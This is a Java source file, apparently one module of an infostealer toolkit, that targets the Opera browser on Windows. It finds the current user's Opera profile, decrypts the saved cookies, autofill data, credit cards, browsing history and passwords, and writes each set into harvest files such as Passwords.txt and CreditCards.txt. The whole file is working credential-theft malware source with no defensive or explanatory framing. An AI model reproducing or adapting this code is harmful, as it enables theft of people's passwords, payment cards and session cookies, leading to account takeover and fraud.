package _256.node.nodes.impl.browser;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

import _256.node.Category;
import _256.node.Node;
import _256.utils.decrypt.autofill.AutoFillDecrypt;
import _256.utils.decrypt.cookie.CookieDecrypt;
import _256.utils.decrypt.creditcards.CreditCardsDecrypt;
import _256.utils.decrypt.history.HistoryDecrypt;
import _256.utils.decrypt.password.PasswordDecrypt;

public class Opera extends Node {

	public Opera() {
		super(Category.FILE);
	}

	@Override
	public void createNode() throws IOException {
		if (new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Cookies").exists()) {
			cookie();
		}
		if (new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Web Data").exists()) {
			autoFill();
			creditCards();
			history();
		}
		if (new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data").exists()) {
			password();
		}
	}

	public void autoFill() throws IOException {
		if (!new AutoFillDecrypt("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Web Data", "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State").getAutoFill().getData().isEmpty()) {
			FileWriter writer = new FileWriter(mergePath(getFolder(), "General" + "\\" + "AutoFills.txt"), true);
			BufferedWriter bufferedWriter = new BufferedWriter(writer);
			bufferedWriter.write(new AutoFillDecrypt("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Web Data", "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State").getAutoFill().getData());
			bufferedWriter.close();
		}
	}

	public void cookie() throws IOException {
		if (new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Cookies").exists()) {
			FileWriter writer = new FileWriter(mergePath(getFolder(), "Cookies") + "\\" + "Opera.txt", true);
			BufferedWriter bufferedWriter = new BufferedWriter(writer);
			bufferedWriter.write(new CookieDecrypt("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Cookies", "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State").getCookies().getData());
			bufferedWriter.close();
		}
	}

	public void creditCards() throws IOException {
		if (!new CreditCardsDecrypt("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Web Data", "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State").getCards().getData().isEmpty()) {
			FileWriter writer = new FileWriter(mergePath(getFolder(), "General" + "\\" + "CreditCards.txt"), true);
			BufferedWriter bufferedWriter = new BufferedWriter(writer);
			bufferedWriter.write(new CreditCardsDecrypt("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Web Data", "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State").getCards().getData());
			bufferedWriter.close();
		}
	}

	public void history() throws IOException {
		if (!new HistoryDecrypt("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\History", "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State").getHistory().getData().isEmpty()) {
			FileWriter writer = new FileWriter(mergePath(getFolder(), "General" + "\\" + "History.txt"), true);
			BufferedWriter bufferedWriter = new BufferedWriter(writer);
			bufferedWriter.write(new HistoryDecrypt("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\History", "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State").getHistory().getData());
			bufferedWriter.close();
		}
	}

	public void password() throws IOException {
		if (!new PasswordDecrypt("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data", "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State").getPasswords().getData().isEmpty()) {
			FileWriter writer = new FileWriter(mergePath(getFolder(), "General" + "\\" + "Passwords.txt"), true);
			BufferedWriter bufferedWriter = new BufferedWriter(writer);
			bufferedWriter.write(new PasswordDecrypt("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data", "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State").getPasswords().getData());
			bufferedWriter.close();
		}
	}
}